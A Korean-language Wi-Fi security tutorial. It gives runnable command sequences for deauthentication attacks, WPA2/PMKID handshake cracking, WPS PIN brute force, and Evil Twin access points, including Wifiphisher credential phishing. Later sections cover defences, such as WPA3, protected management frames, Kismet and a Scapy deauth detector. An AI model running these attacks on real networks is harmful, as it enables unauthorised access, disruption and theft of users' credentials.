# 무선 네트워크 해킹 — Wi-Fi 보안 완전 가이드

## 1. 무선 네트워크 기초

### 802.11 표준
| 표준 | 주파수 | 최대 속도 | 보안 |
|------|--------|---------|------|
| 802.11b | 2.4GHz | 11Mbps | WEP (취약) |
| 802.11g | 2.4GHz | 54Mbps | WPA |
| 802.11n | 2.4/5GHz | 600Mbps | WPA2 |
| 802.11ac | 5GHz | 3.5Gbps | WPA2/WPA3 |
| 802.11ax (Wi-Fi 6) | 2.4/5/6GHz | 9.6Gbps | WPA3 |

### 무선 보안 프로토콜 취약점
| 프로토콜 | 취약점 | 공격 방법 |
|---------|--------|---------|
| WEP | RC4 키스트림 재사용 | 패킷 수집 후 크랙 (에어크랙) |
| WPA-TKIP | 취약한 MIC (Michael) | ChopChop, Fragmentation |
| WPA2-PSK | 4-way Handshake 캡처 | 오프라인 딕셔너리 공격 |
| WPA2-Enterprise | 인증서 검증 미흡 | Evil Twin + 가짜 RADIUS |
| WPS | PIN 브루트포스 | Reaver, Bully |

---

## 2. 무선 공격 환경 설정

### 무선 랜카드 모니터 모드 설정

무선 어댑터를 모니터 모드로 전환하면 자신과 연결되지 않은 프레임도 캡처할 수 있습니다. `airmon-ng check kill`로 간섭 프로세스를 종료한 후 `airmon-ng start wlan0`으로 모니터 모드를 활성화합니다.

```bash
# 무선 인터페이스 확인
iwconfig
ip link show

# 모니터 모드 활성화 (airmon-ng)
airmon-ng check kill    # 간섭 프로세스 종료
airmon-ng start wlan0   # 모니터 모드 시작
# → wlan0mon 인터페이스 생성

# 수동 설정
ip link set wlan0 down
iwconfig wlan0 mode monitor
ip link set wlan0 up

# 모니터 모드 확인
iwconfig wlan0mon

# 채널 고정
iwconfig wlan0mon channel 6

# 모니터 모드 종료
airmon-ng stop wlan0mon
```

### 무선 네트워크 스캔

`airodump-ng`로 주변 AP와 클라이언트 목록을 스캔합니다. BSSID, 채널, ESSID, 암호화 방식 등의 정보를 수집하고, `-w` 옵션으로 패킷을 파일에 저장하여 이후 분석에 활용합니다.

```bash
# AP 목록 스캔
airodump-ng wlan0mon

# 특정 채널 스캔
airodump-ng --channel 6 wlan0mon

# 특정 AP의 클라이언트 확인
airodump-ng --bssid AA:BB:CC:DD:EE:FF -c 6 wlan0mon

# 패킷 파일로 저장
airodump-ng --bssid AA:BB:CC:DD:EE:FF -c 6 -w capture wlan0mon
# → capture-01.cap, capture-01.csv 생성
```

---

## 3. WPA2 PSK 크랙

### 4-way Handshake 캡처

WPA2 크래킹을 위해 클라이언트가 AP에 재연결할 때 발생하는 4-Way Handshake를 캡처합니다. `aireplay-ng --deauth`로 연결을 끊으면 자동 재연결 시 핸드셰이크가 발생합니다.

```bash
# Step 1: AP 스캔으로 목표 정보 확인
airodump-ng wlan0mon
# BSSID: AA:BB:CC:DD:EE:FF, Channel: 6, ESSID: TargetWiFi

# Step 2: 목표 AP 모니터링 & 핸드셰이크 캡처
airodump-ng --bssid AA:BB:CC:DD:EE:FF -c 6 -w handshake wlan0mon

# Step 3: 클라이언트 연결 해제 강제 (핸드셰이크 유도)
# 별도 터미널에서:
aireplay-ng --deauth 5 -a AA:BB:CC:DD:EE:FF wlan0mon
# -a: AP BSSID
# 5: deauth 패킷 수
# 특정 클라이언트만 연결 해제:
aireplay-ng --deauth 5 -a AA:BB:CC:DD:EE:FF -c 11:22:33:44:55:66 wlan0mon

# Step 4: 핸드셰이크 확인
# airodump-ng 상단에 "WPA handshake: AA:BB:CC:DD:EE:FF" 메시지 확인
```

### WPA2 핸드셰이크 크랙

캡처한 WPA2 4-way 핸드셰이크 파일을 aircrack-ng 또는 hashcat으로 오프라인 크래킹합니다. 사전 파일의 품질이 크래킹 성공 여부를 결정합니다.

```bash
# aircrack-ng (CPU 기반)
aircrack-ng handshake-01.cap -w /usr/share/wordlists/rockyou.txt
aircrack-ng handshake-01.cap -e "TargetWiFi" -w rockyou.txt

# hashcat (GPU 기반, 훨씬 빠름)
# 먼저 cap 파일을 hashcat 형식으로 변환
hcxpcapngtool -o hash.hc22000 handshake-01.cap
# 또는
cap2hccapx handshake-01.cap handshake.hccapx

# hashcat으로 크랙
hashcat -m 22000 hash.hc22000 rockyou.txt        # 사전 공격
hashcat -m 22000 hash.hc22000 -a 3 ?d?d?d?d?d?d?d?d  # 8자리 숫자 브루트포스

# 커스텀 규칙
hashcat -m 22000 hash.hc22000 rockyou.txt -r /usr/share/hashcat/rules/best64.rule

# 진행 상황 확인 (실행 중)
# s 키: 상태 표시
# q 키: 종료
# p 키: 일시 정지
```

---

## 4. WPS 공격

### Reaver (WPS PIN 브루트포스)

Reaver로 WPS(Wi-Fi Protected Setup) PIN 브루트포스 공격을 수행합니다. WPS가 활성화된 AP를 대상으로 8자리 PIN을 무차별 대입합니다.

```bash
# WPS 활성화 AP 탐지
wash -i wlan0mon

# Reaver 기본 공격
reaver -i wlan0mon -b AA:BB:CC:DD:EE:FF -vv

# 성능 최적화 옵션
reaver -i wlan0mon -b AA:BB:CC:DD:EE:FF -vv \
    -d 0 \        # 딜레이 없음
    -N \          # NACK 전송
    -S \          # 소규모 DH 키
    -L \          # 잠금 무시

# Pixie Dust 공격 (WPS offline 공격, 일부 AP에서 효과적)
reaver -i wlan0mon -b AA:BB:CC:DD:EE:FF -K 1 -vv

# Bully (Reaver 대안)
bully wlan0mon -b AA:BB:CC:DD:EE:FF -d -v 3
```

---

## 5. Evil Twin 공격 (가짜 AP)

### 기본 Evil Twin 설정

Evil Twin 공격은 정상 AP와 동일한 SSID로 가짜 AP를 만들어 클라이언트를 속이는 기법입니다. `hostapd`로 가짜 AP를 구성하고 `dnsmasq`로 DHCP를 제공하며, 연결된 피해자의 트래픽을 가로채거나 인증 페이지로 유도합니다.

```bash
# 1단계: 가짜 AP 생성 (hostapd)
cat > /tmp/hostapd.conf << EOF
interface=wlan0
driver=nl80211
ssid=TargetWiFi        # 타겟 AP와 동일한 SSID
hw_mode=g
channel=6
macaddr_acl=0
ignore_broadcast_ssid=0
EOF

hostapd /tmp/hostapd.conf &

# 2단계: DHCP 서버 설정
apt-get install dnsmasq

cat > /tmp/dnsmasq.conf << EOF
interface=wlan0
dhcp-range=192.168.1.2,192.168.1.30,255.255.255.0,12h
dhcp-option=3,192.168.1.1
dhcp-option=6,192.168.1.1
server=8.8.8.8
log-queries
log-dhcp
listen-address=127.0.0.1
EOF

ip addr add 192.168.1.1/24 dev wlan0
dnsmasq -C /tmp/dnsmasq.conf

# 3단계: 인터넷 포워딩 (선택적)
iptables --table nat --append POSTROUTING --out-interface eth0 -j MASQUERADE
iptables --append FORWARD --in-interface wlan0 -j ACCEPT
echo 1 > /proc/sys/net/ipv4/ip_forward
```

### Wifiphisher (자동화 Evil Twin)

Wifiphisher는 Evil Twin 공격을 자동화하는 도구입니다. 피해자를 가짜 AP에 연결시키고 피싱 페이지로 자격증명을 탈취합니다.

```bash
apt-get install wifiphisher

# 기본 실행 (대화형)
wifiphisher

# 특정 AP 타겟
wifiphisher --essid "TargetWiFi" --channel 6

# 피싱 페이지 선택
# - firmware-upgrade: 펌웨어 업그레이드 유도
# - oauth-login: OAuth 로그인 페이지
# - wifi_connect: Wi-Fi 비밀번호 재입력 유도
```

---

## 6. 무선 트래픽 분석

### 암호화된 WPA2 트래픽 복호화

캡처된 WPA2 암호화 트래픽을 PSK(Pre-Shared Key)를 이용해 복호화합니다. Wireshark에서 키를 등록하면 패킷 내용을 평문으로 확인할 수 있습니다.

```bash
# Wireshark에서 WPA2 복호화
# Edit → Preferences → Protocols → IEEE 802.11
# Decryption Keys 추가:
# Key Type: wpa-pwd
# Key: password:SSID

# tshark 명령줄 복호화
tshark -r capture.cap \
    -o "wlan.enable_decryption: TRUE" \
    -o "uat:80211_keys:\"wpa-pwd\",\"password:SSID\""

# 복호화된 패킷에서 HTTP 데이터 추출
tshark -r decrypted.pcap -Y http -T fields -e http.request.uri
```

---

## 7. 무선 보안 강화

### WPA2/WPA3 Enterprise 설정 (freeRADIUS)

WPA2/WPA3 Enterprise 환경을 구축하기 위해 freeRADIUS 인증 서버를 설치합니다. 기업 환경에서는 개인 PSK 대신 RADIUS 기반 인증을 사용합니다.

```bash
apt-get install freeradius

# /etc/freeradius/3.0/users 파일에 사용자 추가
# 인증서 기반 EAP 설정 권장

# WPA3 전환 (최신 AP 필요)
# SAE (Simultaneous Authentication of Equals) 사용
# PMKID 공격에 안전
```

### 무선 침입 탐지 (Wids)

Kismet을 무선 침입 탐지 시스템(WIDS)으로 사용합니다. 비인가 AP, 비콘 플러딩, 디어셉티케이션 공격 등을 탐지합니다.

```bash
# Kismet (무선 IDS/IPS)
apt-get install kismet
kismet -c wlan0mon

# 탐지 가능한 공격:
# - Deauthentication 공격
# - AP Spoofing (Evil Twin)
# - WPS 브루트포스
# - 알 수 없는 AP

# airbase-ng으로 허니팟 AP
airbase-ng -e "HoneyPot_AP" -c 6 wlan0mon
```

---

## 8. 무선 네트워크 정찰 심화

### 수동 정찰 (탐지 위험 없음)

탐지 위험을 최소화하면서 무선 환경을 정찰하는 방법입니다. 채널을 순환하며 주변 AP와 클라이언트 정보를 수집합니다.

```bash
# 채널 호핑하며 모든 AP 스캔
airodump-ng wlan0mon --band abg    # 2.4GHz + 5GHz 동시 스캔

# 숨겨진 SSID 탐지
# AP가 SSID를 브로드캐스트하지 않아도
# 클라이언트가 Probe Request 보낼 때 캡처 가능
airodump-ng --bssid AA:BB:CC:DD:EE:FF -c 6 wlan0mon
# → 클라이언트의 Probe Request에서 실제 SSID 확인

# 5GHz 대역 스캔
airmon-ng start wlan0 36    # 36번 채널로 고정 (5GHz)
airodump-ng --band a wlan0mon
```

### 클라이언트 정보 수집

무선 클라이언트가 보내는 Probe Request 패킷을 수집합니다. 클라이언트가 이전에 연결했던 AP 목록(PNL)을 파악할 수 있습니다.

```bash
# Probe Request 수집 (클라이언트가 연결 시도한 AP 목록)
airodump-ng wlan0mon | grep "STATION"
# STATION 컬럼: 클라이언트 MAC
# Probed ESSIDs: 클라이언트가 찾는 SSID 목록

# 특정 클라이언트 추적
airodump-ng wlan0mon --bssid [클라이언트MAC] 

# 클라이언트가 저장한 SSID 목록 수집 (수동 정찰)
# → Evil Twin 공격의 타겟 SSID 확보
```

---

## 9. PMKID 공격 (핸드셰이크 없이 크랙)

### hcxdumptool을 이용한 PMKID 캡처

PMKID 공격은 클라이언트 연결 없이도 AP에서 PMKID를 추출하여 WPA2 키를 오프라인으로 크래킹합니다. 2018년 발견된 기법으로 핸드셰이크 캡처보다 효율적입니다.

```bash
# 설치
apt-get install hcxdumptool hcxtools

# PMKID 캡처 (클라이언트 불필요)
hcxdumptool -i wlan0mon -o pmkid.pcapng --enable_status=1

# 특정 AP만 타겟
hcxdumptool -i wlan0mon -o pmkid.pcapng \
    --filterlist_ap=target_bssid.txt \
    --filtermode=2 \
    --enable_status=1

# pcapng를 hashcat 형식으로 변환
hcxpcapngtool -o hash.hc22000 pmkid.pcapng

# hashcat으로 크랙
hashcat -m 22000 hash.hc22000 /usr/share/wordlists/rockyou.txt
hashcat -m 22000 hash.hc22000 -a 3 ?d?d?d?d?d?d?d?d    # 숫자 8자리
hashcat -m 22000 hash.hc22000 -a 3 ?l?l?l?l?l?l?l?l    # 소문자 8자리
```

### PMKID 이해
```
PMKID = HMAC-SHA1-128(PMK, "PMK Name" || BSSID || STA_MAC)

장점:
- 클라이언트가 연결되지 않아도 AP만 있으면 공격 가능
- 4-way Handshake 캡처 불필요
- 단 하나의 EAPOL 프레임만 필요

제한:
- 일부 오래된 AP는 PMKID를 포함하지 않음
- WPA2만 해당 (WPA3의 SAE는 PMKID 공격에 안전)
```

---

## 10. WPA3 및 현대적 무선 보안

### WPA3 특징과 SAE
```
SAE (Simultaneous Authentication of Equals):
- Dragonfly 핸드셰이크 기반
- 전방 비밀성 (Forward Secrecy) 제공
- 오프라인 딕셔너리 공격 불가
- PMKID 공격 불가

WPA3 모드:
- WPA3-Personal (SAE): 가정용, PSK 대체
- WPA3-Enterprise (192-bit): 기업용, Suite-B 암호화
- WPA3 Enhanced Open (OWE): 오픈 AP 암호화

# WPA3 Dragonblood 취약점 (2019)
- 사이드채널 공격으로 비밀번호 추측 가능
- DoS 공격 (안전한 채널 다운그레이드)
→ 대부분 패치됨
```

### 무선 네트워크 암호화 비교
```
프로토콜 강도 비교 (약 → 강):
WEP < WPA-TKIP < WPA2-TKIP < WPA2-AES(CCMP) < WPA3-SAE

권장 설정:
- WPA2-AES (CCMP) 최소
- WPA3-SAE 권장
- Mixed WPA2/WPA3 (호환성)
- TKIP 절대 사용 금지
- WPS 비활성화 권장
```

---

## 11. 무선 해킹 방어 체크리스트

### AP 보안 설정
```
기본 보안:
[ ] WPA3 또는 WPA2-AES 사용
[ ] 강력한 패스워드 (12자 이상, 특수문자 포함)
[ ] WPS 비활성화
[ ] 관리자 기본 자격증명 변경
[ ] 최신 펌웨어 업데이트
[ ] SSID 브로드캐스트 (숨겨도 보안 효과 미미)
[ ] 게스트 네트워크 분리 (VLAN)

고급 보안:
[ ] 802.1X Enterprise 인증 (RADIUS)
[ ] 클라이언트 격리 (AP 간 통신 차단)
[ ] 무선 IDS 설치 (Kismet, WIPS)
[ ] MAC 필터링 (우회 가능하나 추가 레이어)
[ ] 송출 전력 최소화 (필요한 범위만)
[ ] WIDS (Wireless Intrusion Detection System)
```

### Deauthentication 공격 방어
```
802.11w (PMF: Protected Management Frames):
- 관리 프레임 암호화/무결성 검증
- Deauth 공격, 차단 공격 방어

# hostapd.conf에서 PMF 활성화
ieee80211w=2       # 2=required (강제), 1=optional

# 클라이언트에서 확인 (Linux)
iw dev wlan0 link | grep -i pmf
```

---

## 12. 무선 패킷 분석 — Wireshark 802.11

### 802.11 프레임 구조 분석
```
Wireshark 802.11 필터:
  wlan.fc.type == 0         # Management 프레임
  wlan.fc.type == 1         # Control 프레임  
  wlan.fc.type == 2         # Data 프레임

  wlan.fc.type_subtype == 0x08  # Beacon 프레임
  wlan.fc.type_subtype == 0x04  # Probe Request
  wlan.fc.type_subtype == 0x05  # Probe Response
  wlan.fc.type_subtype == 0x0b  # Authentication
  wlan.fc.type_subtype == 0x00  # Association Request
  wlan.fc.type_subtype == 0x0c  # Deauthentication ← 공격 탐지
  wlan.fc.type_subtype == 0x0a  # Disassociation

# Deauth 공격 탐지
wlan.fc.type_subtype == 0x0c and wlan.da == ff:ff:ff:ff:ff:ff
# 브로드캐스트 Deauth = 공격 패턴

# 4-way Handshake 캡처 확인
eapol and wlan.bssid == AA:BB:CC:DD:EE:FF
```

### 채널 전환 공격 (Channel Switch Announcement)
```
공격 원리:
- 합법적인 AP처럼 채널 전환 공고
- 클라이언트를 다른 채널로 유도
- Evil Twin이 해당 채널에서 대기

탐지:
wlan.tag.number == 37    # Channel Switch Announcement IE
```

---

## 13. 무선 패킷 분석 심화 — Wireshark 802.11 전체 레퍼런스

### 802.11 관리 프레임 상세
```
Management 프레임 서브타입 전체:
  0x00 = Association Request       # 클라이언트 → AP 연결 요청
  0x01 = Association Response      # AP → 클라이언트 연결 수락/거부
  0x02 = Reassociation Request     # 로밍 시 재연결 요청
  0x03 = Reassociation Response
  0x04 = Probe Request             # 클라이언트가 AP 탐색
  0x05 = Probe Response            # AP가 탐색에 응답
  0x08 = Beacon                    # AP 주기적 브로드캐스트 (100ms 간격)
  0x0a = Disassociation            # 연결 해제 (일방적)
  0x0b = Authentication            # 802.11 인증 요청/응답
  0x0c = Deauthentication          # 인증 해제 (공격에 악용)
  0x0d = Action                    # 채널 변경 등 관리 동작

Control 프레임 서브타입:
  0x1a = PS-Poll                   # 절전 모드 폴링
  0x1b = RTS                       # Request to Send
  0x1c = CTS                       # Clear to Send
  0x1d = ACK                       # 데이터 수신 확인

Data 프레임:
  wlan.fc.type == 2                # 실제 데이터 전송 프레임
```

### WPA2 4-Way Handshake 패킷 분석
```
Wireshark에서 4-Way Handshake 확인:
  필터: eapol

Message 1 (AP → Client):  ANonce 전송
Message 2 (Client → AP):  SNonce + MIC 포함 (PTK 생성 시작)
Message 3 (AP → Client):  GTK 암호화 전송 + MIC
Message 4 (Client → AP):  설치 확인

핵심: Message 2에서 클라이언트가 PSK를 알고 있음을 증명하는 MIC 포함
     → 이 패킷을 캡처하면 오프라인 사전 공격으로 PSK 크랙 가능

# 특정 AP의 핸드셰이크만 필터
eapol && wlan.bssid == aa:bb:cc:dd:ee:ff

# 핸드셰이크 4단계 확인
eapol && wlan.fc.type_subtype == 0x20    # EAPOL QoS Data
```

### WEP 분석 (레거시 참고)
```
WEP 취약점:
  - RC4 스트림 암호 사용
  - 24비트 IV (Initialization Vector) → 재사용 불가피
  - 같은 IV로 암호화된 두 패킷 → XOR 연산으로 키 복구 가능

Wireshark WEP 필터:
  wlan.wep.iv                      # IV 필드
  wlan.fc.protected == 1           # 암호화된 프레임

크랙 조건:
  - aircrack-ng: 최소 40,000개의 고유 IV 필요 (약 50,000~100,000 패킷)
  - aireplay-ng --arpreplay로 ARP 패킷 재생하여 IV 수집 가속
```

### 무선 프레임 신호 강도 분석
```
Wireshark에서 무선 신호 정보:
  필터: radiotap    # RadioTap 헤더 (드라이버가 추가하는 메타데이터)

확인 가능한 정보:
  radiotap.dbm_antsignal    # 신호 강도 (dBm, 높을수록 강함, 예: -50dBm)
  radiotap.channel.freq     # 채널 주파수 (MHz)
  radiotap.datarate         # 데이터 전송률 (Mbps)
  radiotap.flags.shortpre   # Short Preamble 사용 여부

활용:
  - 동일 SSID에서 신호 강도 다른 Beacon → Evil Twin 탐지 단서
  - 비정상적으로 높은 신호 강도 → 가까운 위치의 공격자
```

### 무선 트래픽 분석 자동화

airodump-ng 결과를 CSV 파일로 저장한 후 스크립트로 자동 분석합니다. 대량의 AP 정보를 체계적으로 처리할 때 유용합니다.

```bash
# airodump-ng 결과를 CSV로 저장 후 분석
airodump-ng wlan0mon -w scan --output-format csv

# CSV 파싱으로 열린 AP 목록 추출
awk -F',' '$6 ~ /OPN/ {print $1, $14}' scan-01.csv

# Wireshark + tshark로 Beacon 수집
tshark -i wlan0mon -Y "wlan.fc.type_subtype == 0x08" \
    -T fields -e wlan.sa -e wlan.ssid -e radiotap.dbm_antsignal \
    -e wlan_radio.channel 2>/dev/null | sort -u

# Deauth 공격 탐지 (비정상적으로 많은 Deauth 프레임)
tshark -i wlan0mon -Y "wlan.fc.type_subtype == 0x0c" \
    -T fields -e wlan.sa -e wlan.da | sort | uniq -c | sort -rn

# 클라이언트의 Probe Request 수집 (연결 이력)
tshark -i wlan0mon -Y "wlan.fc.type_subtype == 0x04 && wlan.ssid" \
    -T fields -e wlan.ta -e wlan.ssid 2>/dev/null | sort -u
```

### 무선 네트워크 분석 자동화 도구 (Python — Scapy 기반)

```python
#!/usr/bin/env python3
"""
802.11 무선 패킷 분석기 — AP 탐지, Deauth 공격 감지, Probe 수집
실행: sudo python3 wifi_analyzer.py [-i wlan0mon] [--deauth-threshold 5]
"""
import argparse
import sys
import threading
import time
from collections import Counter, defaultdict
from datetime import datetime
from typing import Optional

try:
    from scapy.all import (
        sniff, Dot11, Dot11Beacon, Dot11ProbeReq,
        Dot11Deauth, Dot11Disas, RadioTap,
        Dot11Elt,
    )
except ImportError:
    sys.exit("[!] scapy가 필요합니다: pip3 install scapy")


def get_ssid(packet) -> Optional[str]:
    """Dot11Elt에서 SSID 추출."""
    try:
        elt = packet[Dot11Elt]
        while elt:
            if elt.ID == 0:  # SSID element
                return elt.info.decode("utf-8", errors="replace")
            elt = elt.payload if hasattr(elt, "payload") else None
    except Exception:
        pass
    return None


def get_signal(packet) -> Optional[int]:
    """RadioTap 헤더에서 신호 강도(dBm) 추출."""
    try:
        if packet.haslayer(RadioTap):
            return packet[RadioTap].dBm_AntSignal
    except Exception:
        pass
    return None


class WifiAnalyzer:
    def __init__(self, deauth_threshold: int) -> None:
        self.deauth_threshold = deauth_threshold
        self._lock = threading.Lock()

        # AP 정보: {bssid: {ssid, channel, signal, security, beacon_count}}
        self.aps: dict[str, dict] = {}
        # Probe Request: {client_mac: [ssid, ...]}
        self.probes: defaultdict[str, list] = defaultdict(list)
        # Deauth: {src_mac: count}
        self.deauth_counts: Counter = Counter()
        self.stats = {"total": 0, "beacon": 0, "probe": 0, "deauth": 0, "data": 0}

    def _extract_security(self, packet) -> str:
        """AP 보안 방식 추출 (WPA3/WPA2/WPA/WEP/Open)."""
        cap = packet[Dot11Beacon].cap if packet.haslayer(Dot11Beacon) else 0
        if cap & 0x0010:  # Privacy bit
            # RSN IE (ID=48) → WPA2/WPA3
            elt = packet[Dot11Elt] if packet.haslayer(Dot11Elt) else None
            while elt:
                if elt.ID == 48:
                    return "WPA2/WPA3"
                if elt.ID == 221 and elt.info[:4] == b"\x00\x50\xf2\x01":
                    return "WPA"
                elt = elt.payload if hasattr(elt, "payload") else None
            return "WEP"
        return "Open"

    def process(self, pkt) -> None:
        with self._lock:
            self.stats["total"] += 1

            if not pkt.haslayer(Dot11):
                return

            dot11 = pkt[Dot11]
            src = dot11.addr2 or "?"
            dst = dot11.addr1 or "?"

            # Beacon 프레임 (AP 탐지)
            if pkt.haslayer(Dot11Beacon):
                self.stats["beacon"] += 1
                bssid = dot11.addr3 or src
                ssid = get_ssid(pkt) or "<hidden>"
                signal = get_signal(pkt)
                security = self._extract_security(pkt)

                if bssid not in self.aps:
                    self.aps[bssid] = {
                        "ssid": ssid, "signal": signal,
                        "security": security, "beacon_count": 0,
                        "first_seen": datetime.now().strftime("%H:%M:%S"),
                    }
                    print(f"  [AP] {ssid:<25}  {bssid}  {security}  {signal or '?'}dBm")
                self.aps[bssid]["beacon_count"] += 1
                if signal:
                    self.aps[bssid]["signal"] = signal

            # Probe Request (클라이언트 연결 이력)
            elif pkt.haslayer(Dot11ProbeReq):
                self.stats["probe"] += 1
                ssid = get_ssid(pkt)
                if ssid and ssid not in self.probes[src]:
                    self.probes[src].append(ssid)

            # Deauth / Disassociation 공격 탐지
            elif pkt.haslayer(Dot11Deauth) or pkt.haslayer(Dot11Disas):
                self.stats["deauth"] += 1
                self.deauth_counts[src] += 1
                if self.deauth_counts[src] == self.deauth_threshold:
                    ts = datetime.now().strftime("%H:%M:%S")
                    frame_type = "Deauth" if pkt.haslayer(Dot11Deauth) else "Disassoc"
                    print(
                        f"\n  [!] {frame_type} 공격 의심!  {ts}"
                        f"\n      공격자: {src}  →  대상: {dst}"
                        f"\n      횟수: {self.deauth_counts[src]}"
                    )

    def print_summary(self) -> None:
        print("\n" + "=" * 60)
        print("  Wi-Fi 분석 요약")
        print("=" * 60)
        s = self.stats
        print(f"  총 패킷:  {s['total']}  |  Beacon: {s['beacon']}  |  "
              f"Probe: {s['probe']}  |  Deauth: {s['deauth']}")

        print(f"\n  발견된 AP ({len(self.aps)}개)")
        for bssid, info in sorted(self.aps.items(), key=lambda x: -(x[1]["beacon_count"])):
            print(f"    {info['ssid']:<25}  {bssid}  "
                  f"{info['security']:<10}  {info['signal'] or '?':>4}dBm")

        print(f"\n  클라이언트 Probe 기록 ({len(self.probes)}개)")
        for mac, ssids in list(self.probes.items())[:15]:
            print(f"    {mac}  →  {', '.join(ssids[:5])}")

        if self.deauth_counts:
            print(f"\n  Deauth 발신 Top 5")
            for mac, count in self.deauth_counts.most_common(5):
                print(f"    {mac}  {count}회")


def main() -> None:
    parser = argparse.ArgumentParser(description="802.11 무선 패킷 분석기")
    parser.add_argument("-i", "--iface", default="wlan0mon",
                        help="모니터 모드 인터페이스 (기본값: wlan0mon)")
    parser.add_argument("--deauth-threshold", type=int, default=5,
                        help="Deauth 공격 경보 임계값 (기본값: 5)")
    parser.add_argument("-t", "--timeout", type=int, default=0,
                        help="캡처 시간(초). 0=무제한")
    args = parser.parse_args()

    analyzer = WifiAnalyzer(args.deauth_threshold)
    print(f"[*] 무선 모니터링 시작: {args.iface}")
    print(f"[*] Deauth 임계값: {args.deauth_threshold}회  |  종료: Ctrl+C\n")

    try:
        sniff(
            iface=args.iface,
            prn=analyzer.process,
            store=False,
            timeout=args.timeout if args.timeout > 0 else None,
        )
    except KeyboardInterrupt:
        pass
    finally:
        analyzer.print_summary()


if __name__ == "__main__":
    main()
```

---

## 14. 무선 네트워크 포렌식

### 캡처 파일에서 WPA2 복호화

캡처된 패킷 파일에서 WPA2 키를 이용해 암호화 트래픽을 복호화합니다. 사전에 PSK를 알고 있을 때 오프라인으로 분석할 수 있습니다.

```bash
# 방법 1: Wireshark GUI
Edit → Preferences → Protocols → IEEE 802.11
→ Enable decryption 체크
→ Decryption keys 추가:
   Key type: wpa-pwd
   Key: MyPassword:MySSID

# 방법 2: tshark 명령줄
tshark -r wifi_capture.pcap \
    -o "wlan.enable_decryption: TRUE" \
    -o 'uat:80211_keys:"wpa-pwd","password:SSID"' \
    -Y http -T fields -e ip.src -e http.host -e http.request.uri

# 방법 3: airdecap-ng (별도 도구)
airdecap-ng -e "MySSID" -p "MyPassword" capture.cap
# → 복호화된 파일 capture-dec.cap 생성
```

### PMKID vs 4-Way Handshake 비교
```
4-Way Handshake:
  - 클라이언트가 AP에 연결될 때 캡처
  - 클라이언트가 있어야 함 (Deauth 강제 유도 필요)
  - EAPOL 프레임 4개 필요

PMKID:
  - AP만 있으면 됨 (클라이언트 불필요)
  - Association Request의 RSN IE에서 추출
  - PMKID = HMAC-SHA1-128(PMK, "PMK Name" || BSSID || STA_MAC)
  - hcxdumptool으로 캡처

공통 크랙 방법:
  # hashcat으로 GPU 가속 크랙
  hashcat -m 22000 hash.hc22000 rockyou.txt
  
  # 속도 비교:
  CPU (aircrack-ng): ~1,000 PMK/sec
  GPU (hashcat):     ~100,000~1,000,000 PMK/sec (GPU 성능에 따라 다름)
```

### 채널 분석 및 간섭 탐지

주파수 채널별 AP 분포를 분석하여 채널 간섭과 혼잡도를 파악합니다. 최적 채널 선택과 간섭 원인 탐지에 활용됩니다.

```bash
# 채널별 AP 분포 확인
airodump-ng wlan0mon --band abg 2>/dev/null | grep -v "BSSID" | \
    awk '{print $4}' | sort | uniq -c | sort -rn

# 2.4GHz 비겹치는 채널: 1, 6, 11
# 5GHz: 36, 40, 44, 48, 149, 153, 157, 161 등

# Wireshark로 채널 오버랩 분석
# 동일 채널의 다른 SSID 확인
tshark -r capture.pcap -Y "wlan.fc.type_subtype == 0x08" \
    -T fields -e wlan_radio.channel -e wlan.ssid | sort | uniq -c
```
